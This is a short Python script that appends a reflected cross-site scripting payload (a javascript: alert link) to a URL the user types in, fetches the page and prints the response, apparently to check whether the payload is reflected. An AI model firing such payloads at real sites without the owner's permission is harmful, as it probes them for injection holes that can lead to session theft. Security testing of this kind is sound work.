import requests

url = input("URL: ")
payload = "<a href=javascript:alert('XSS')>Click Me</a>"

response = requests.get(url + payload)
print(response.text)
